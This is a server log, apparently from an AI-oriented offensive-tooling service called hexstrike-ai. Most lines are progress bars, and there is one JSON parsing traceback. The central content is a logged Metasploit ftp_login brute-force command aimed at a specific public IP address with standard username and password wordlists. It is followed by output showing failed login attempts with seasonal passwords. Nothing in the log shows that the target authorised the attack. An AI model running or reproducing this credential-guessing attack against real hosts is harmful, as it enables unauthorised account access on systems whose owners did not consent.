2025-10-24 01:35:37,500 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.7%[0m ETA: 195.8s Speed: 5 B/s | 104.2s | PID: 44124
2025-10-24 01:35:38,301 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.0%[0m ETA: 195.0s Speed: 5 B/s | 105.0s | PID: 44124
2025-10-24 01:35:39,102 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.3%[0m ETA: 194.2s Speed: 5 B/s | 105.8s | PID: 44124
2025-10-24 01:35:39,904 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.5%[0m ETA: 193.4s Speed: 5 B/s | 106.6s | PID: 44124
2025-10-24 01:35:40,704 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.8%[0m ETA: 192.6s Speed: 5 B/s | 107.4s | PID: 44124
2025-10-24 01:35:41,505 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.1%[0m ETA: 191.8s Speed: 5 B/s | 108.2s | PID: 44124
2025-10-24 01:35:42,305 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.3%[0m ETA: 191.0s Speed: 5 B/s | 109.0s | PID: 44124
2025-10-24 01:35:43,106 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.6%[0m ETA: 190.2s Speed: 5 B/s | 109.8s | PID: 44124
2025-10-24 01:35:43,907 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.9%[0m ETA: 189.4s Speed: 5 B/s | 110.6s | PID: 44124
2025-10-24 01:35:44,708 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.1%[0m ETA: 188.6s Speed: 5 B/s | 111.4s | PID: 44124
2025-10-24 01:35:45,509 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.4%[0m ETA: 187.8s Speed: 5 B/s | 112.2s | PID: 44124
2025-10-24 01:35:46,310 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.7%[0m ETA: 187.0s Speed: 5 B/s | 113.0s | PID: 44124
2025-10-24 01:35:47,111 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.9%[0m ETA: 186.2s Speed: 5 B/s | 113.8s | PID: 44124
2025-10-24 01:35:47,912 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.2%[0m ETA: 185.4s Speed: 5 B/s | 114.6s | PID: 44124
2025-10-24 01:35:48,713 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.5%[0m ETA: 184.6s Speed: 5 B/s | 115.4s | PID: 44124
2025-10-24 01:35:49,513 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.7%[0m ETA: 183.8s Speed: 4 B/s | 116.2s | PID: 44124
2025-10-24 01:35:50,315 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.0%[0m ETA: 183.0s Speed: 4 B/s | 117.0s | PID: 44124
2025-10-24 01:35:51,116 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.3%[0m ETA: 182.2s Speed: 4 B/s | 117.8s | PID: 44124
2025-10-24 01:35:51,916 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.5%[0m ETA: 181.4s Speed: 4 B/s | 118.6s | PID: 44124
2025-10-24 01:35:52,717 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.8%[0m ETA: 180.6s Speed: 4 B/s | 119.4s | PID: 44124
2025-10-24 01:35:53,520 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.1%[0m ETA: 179.8s Speed: 4 B/s | 120.2s | PID: 44124
2025-10-24 01:35:54,322 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.3%[0m ETA: 179.0s Speed: 4 B/s | 121.0s | PID: 44124
2025-10-24 01:35:55,124 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.6%[0m ETA: 178.2s Speed: 4 B/s | 121.8s | PID: 44124
2025-10-24 01:35:55,926 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.9%[0m ETA: 177.4s Speed: 4 B/s | 122.6s | PID: 44124
2025-10-24 01:35:56,726 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.1%[0m ETA: 176.6s Speed: 4 B/s | 123.4s | PID: 44124
2025-10-24 01:35:57,527 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.4%[0m ETA: 175.8s Speed: 4 B/s | 124.2s | PID: 44124
2025-10-24 01:35:58,328 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.7%[0m ETA: 175.0s Speed: 4 B/s | 125.0s | PID: 44124
2025-10-24 01:35:59,129 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.9%[0m ETA: 174.2s Speed: 4 B/s | 125.8s | PID: 44124
2025-10-24 01:35:59,931 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.2%[0m ETA: 173.4s Speed: 4 B/s | 126.6s | PID: 44124
2025-10-24 01:36:00,733 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.5%[0m ETA: 172.6s Speed: 4 B/s | 127.4s | PID: 44124
2025-10-24 01:36:01,525 - __main__ - ERROR - 💥 Error in command endpoint: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
2025-10-24 01:36:01,533 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.7%[0m ETA: 171.8s Speed: 4 B/s | 128.2s | PID: 44124
2025-10-24 01:36:01,535 - __main__ - ERROR - Traceback (most recent call last):
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 611, in get_json
    rv = self.json_module.loads(data)
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/flask/json/provider.py", line 187, in loads
    return json.loads(s, **kwargs)
           ~~~~~~~~~~^^^^^^^^^^^^^
  File "/usr/lib/python3.13/json/__init__.py", line 346, in loads
    return _default_decoder.decode(s)
           ~~~~~~~~~~~~~~~~~~~~~~~^^^
  File "/usr/lib/python3.13/json/decoder.py", line 345, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
               ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/json/decoder.py", line 361, in raw_decode
    obj, end = self.scan_once(s, idx)
               ~~~~~~~~~~~~~~^^^^^^^^
json.decoder.JSONDecodeError: Invalid \escape: line 1 column 33 (char 32)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/flask/wrappers.py", line 131, in on_json_loading_failed
    return super().on_json_loading_failed(e)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 645, in on_json_loading_failed
    raise BadRequest(f"Failed to decode JSON object: {e}")
werkzeug.exceptions.BadRequest: 400 Bad Request: Failed to decode JSON object: Invalid \escape: line 1 column 33 (char 32)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/opt/hexstrike-ai/hexstrike_server.py", line 11762, in generic_command
    params = request.json
             ^^^^^^^^^^^^
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 560, in json
    return self.get_json()
           ~~~~~~~~~~~~~^^
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 620, in get_json
    rv = self.on_json_loading_failed(e)
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/flask/wrappers.py", line 136, in on_json_loading_failed
    raise BadRequest() from e
werkzeug.exceptions.BadRequest: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.

2025-10-24 01:36:01,535 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:36:01] "[35m[1mPOST /api/command HTTP/1.1[0m" 500 -
2025-10-24 01:36:02,334 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.0%[0m ETA: 171.0s Speed: 4 B/s | 129.0s | PID: 44124
2025-10-24 01:36:03,135 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.3%[0m ETA: 170.2s Speed: 4 B/s | 129.8s | PID: 44124
2025-10-24 01:36:03,936 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.5%[0m ETA: 169.4s Speed: 4 B/s | 130.6s | PID: 44124
2025-10-24 01:36:04,737 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.8%[0m ETA: 168.6s Speed: 4 B/s | 131.4s | PID: 44124
2025-10-24 01:36:05,537 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.1%[0m ETA: 167.8s Speed: 4 B/s | 132.2s | PID: 44124
2025-10-24 01:36:06,339 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.3%[0m ETA: 167.0s Speed: 4 B/s | 133.0s | PID: 44124
2025-10-24 01:36:07,139 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.6%[0m ETA: 166.2s Speed: 4 B/s | 133.8s | PID: 44124
2025-10-24 01:36:07,941 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.9%[0m ETA: 165.4s Speed: 4 B/s | 134.6s | PID: 44124
2025-10-24 01:36:08,325 - __main__ - INFO - 🔍 Cache MISS for command: msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 138.197.27.76; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set PASS_FILE /usr/share/wordlists/fasttrack.txt; set THREADS 5; run; exit"
2025-10-24 01:36:08,325 - __main__ - INFO - 🚀 EXECUTING: msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 138.197.27.76; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set PASS_FILE /usr/share/wordlists/fasttrack.txt; set THREADS 5; run; exit"
2025-10-24 01:36:08,325 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:36:08,326 - __main__ - INFO - 🆔 PROCESS: PID 44299 started
2025-10-24 01:36:08,326 - __main__ - INFO - 🆔 REGISTERED: Process 44299 - msfconsole -q -x "use auxiliary/scanner/ftp/ftp_lo...
2025-10-24 01:36:08,327 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44299
2025-10-24 01:36:08,741 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.1%[0m ETA: 164.6s Speed: 4 B/s | 135.4s | PID: 44124
2025-10-24 01:36:09,127 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 0 B/s | 0.8s | PID: 44299
2025-10-24 01:36:09,542 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.4%[0m ETA: 163.8s Speed: 4 B/s | 136.2s | PID: 44124
2025-10-24 01:36:09,928 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 0 B/s | 1.6s | PID: 44299
2025-10-24 01:36:10,342 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.7%[0m ETA: 163.0s Speed: 4 B/s | 137.0s | PID: 44124
2025-10-24 01:36:10,728 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 0 B/s | 2.4s | PID: 44299
2025-10-24 01:36:11,142 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.9%[0m ETA: 162.2s Speed: 4 B/s | 137.8s | PID: 44124
2025-10-24 01:36:11,529 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 0 B/s | 3.2s | PID: 44299
2025-10-24 01:36:11,943 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.2%[0m ETA: 161.4s Speed: 4 B/s | 138.6s | PID: 44124
2025-10-24 01:36:12,329 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 0 B/s | 4.0s | PID: 44299
2025-10-24 01:36:12,743 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.5%[0m ETA: 160.6s Speed: 4 B/s | 139.4s | PID: 44124
2025-10-24 01:36:13,131 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 0 B/s | 4.8s | PID: 44299
2025-10-24 01:36:13,543 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m46.7%[0m ETA: 159.8s Speed: 4 B/s | 140.2s | PID: 44124
2025-10-24 01:36:13,931 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 0 B/s | 5.6s | PID: 44299
2025-10-24 01:36:14,344 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.0%[0m ETA: 159.0s Speed: 4 B/s | 141.0s | PID: 44124
2025-10-24 01:36:14,731 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.1%[0m Speed: 0 B/s | 6.4s | PID: 44299
2025-10-24 01:36:15,144 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.3%[0m ETA: 158.2s Speed: 4 B/s | 141.8s | PID: 44124
2025-10-24 01:36:15,532 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.4%[0m Speed: 0 B/s | 7.2s | PID: 44299
2025-10-24 01:36:15,944 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.5%[0m ETA: 157.4s Speed: 4 B/s | 142.6s | PID: 44124
2025-10-24 01:36:16,332 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.7%[0m Speed: 0 B/s | 8.0s | PID: 44299
2025-10-24 01:36:16,747 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.8%[0m ETA: 156.6s Speed: 4 B/s | 143.4s | PID: 44124
2025-10-24 01:36:17,132 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.9%[0m Speed: 0 B/s | 8.8s | PID: 44299
2025-10-24 01:36:17,548 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.1%[0m ETA: 155.8s Speed: 4 B/s | 144.2s | PID: 44124
2025-10-24 01:36:17,933 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.2%[0m Speed: 0 B/s | 9.6s | PID: 44299
2025-10-24 01:36:18,348 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.3%[0m ETA: 155.0s Speed: 4 B/s | 145.0s | PID: 44124
2025-10-24 01:36:18,733 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.5%[0m Speed: 0 B/s | 10.4s | PID: 44299
2025-10-24 01:36:19,149 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.6%[0m ETA: 154.2s Speed: 4 B/s | 145.8s | PID: 44124
2025-10-24 01:36:19,534 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.7%[0m Speed: 0 B/s | 11.2s | PID: 44299
2025-10-24 01:36:19,950 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.9%[0m ETA: 153.4s Speed: 4 B/s | 146.6s | PID: 44124
2025-10-24 01:36:20,336 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.0%[0m Speed: 0 B/s | 12.0s | PID: 44299
2025-10-24 01:36:20,751 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.1%[0m ETA: 152.6s Speed: 4 B/s | 147.4s | PID: 44124
2025-10-24 01:36:21,137 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.3%[0m Speed: 0 B/s | 12.8s | PID: 44299
2025-10-24 01:36:21,553 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.4%[0m ETA: 151.8s Speed: 4 B/s | 148.2s | PID: 44124
2025-10-24 01:36:21,937 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.5%[0m Speed: 0 B/s | 13.6s | PID: 44299
2025-10-24 01:36:22,356 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.7%[0m ETA: 151.0s Speed: 3 B/s | 149.0s | PID: 44124
2025-10-24 01:36:22,738 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.8%[0m Speed: 0 B/s | 14.4s | PID: 44299
2025-10-24 01:36:23,157 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.9%[0m ETA: 150.2s Speed: 3 B/s | 149.8s | PID: 44124
2025-10-24 01:36:23,539 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.1%[0m ETA: 284.8s Speed: 0 B/s | 15.2s | PID: 44299
2025-10-24 01:36:23,958 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.2%[0m ETA: 149.4s Speed: 3 B/s | 150.6s | PID: 44124
2025-10-24 01:36:24,341 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.3%[0m ETA: 284.0s Speed: 0 B/s | 16.0s | PID: 44299
2025-10-24 01:36:24,760 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.5%[0m ETA: 148.5s Speed: 3 B/s | 151.5s | PID: 44124
2025-10-24 01:36:25,143 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.6%[0m ETA: 283.2s Speed: 0 B/s | 16.8s | PID: 44299
2025-10-24 01:36:25,561 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.8%[0m ETA: 147.7s Speed: 3 B/s | 152.3s | PID: 44124
2025-10-24 01:36:25,861 - __main__ - INFO - 📤 STDOUT: [0m[0mRHOSTS => 138.197.27.76
2025-10-24 01:36:25,861 - __main__ - INFO - 📤 STDOUT: [0mUSER_FILE => /usr/share/wordlists/metasploit/unix_users.txt
2025-10-24 01:36:25,862 - __main__ - INFO - 📤 STDOUT: [0mPASS_FILE => /usr/share/wordlists/fasttrack.txt
2025-10-24 01:36:25,862 - __main__ - INFO - 📤 STDOUT: [0mTHREADS => 5
2025-10-24 01:36:25,872 - __main__ - INFO - 📤 STDOUT: [0m[1m[34m[*][0m 138.197.27.76:21      - 138.197.27.76:21 - Starting FTP login sweep
2025-10-24 01:36:25,944 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.9%[0m ETA: 282.4s Speed: 14 B/s | 17.6s | PID: 44299
2025-10-24 01:36:26,362 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.0%[0m ETA: 146.9s Speed: 3 B/s | 153.1s | PID: 44124
2025-10-24 01:36:26,415 - __main__ - INFO - 📤 STDOUT: [1m[33m[!][0m 138.197.27.76:21      - No active DB -- Credential data will not be saved!
2025-10-24 01:36:26,415 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2017 (Incorrect: )
2025-10-24 01:36:26,745 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.1%[0m ETA: 281.6s Speed: 24 B/s | 18.4s | PID: 44299
2025-10-24 01:36:26,968 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2021 (Incorrect: )
2025-10-24 01:36:27,163 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.3%[0m ETA: 146.1s Speed: 3 B/s | 153.9s | PID: 44124
2025-10-24 01:36:27,503 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2021 (Incorrect: )
2025-10-24 01:36:27,545 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.4%[0m ETA: 280.8s Speed: 34 B/s | 19.2s | PID: 44299
2025-10-24 01:36:27,965 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.6%[0m ETA: 145.3s Speed: 3 B/s | 154.7s | PID: 44124
2025-10-24 01:36:28,030 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2021 (Incorrect: )
2025-10-24 01:36:28,347 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.7%[0m ETA: 280.0s Speed: 37 B/s | 20.0s | PID: 44299
2025-10-24 01:36:28,605 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2021 (Incorrect: )
2025-10-24 01:36:28,765 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.8%[0m ETA: 144.5s Speed: 3 B/s | 155.5s | PID: 44124
2025-10-24 01:36:29,131 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2021 (Incorrect: )
2025-10-24 01:36:29,148 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.9%[0m ETA: 279.2s Speed: 45 B/s | 20.8s | PID: 44299
2025-10-24 01:36:29,566 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.1%[0m ETA: 143.7s Speed: 3 B/s | 156.3s | PID: 44124
2025-10-24 01:36:29,653 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2021 (Incorrect: )
2025-10-24 01:36:29,949 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.2%[0m ETA: 278.4s Speed: 48 B/s | 21.6s | PID: 44299
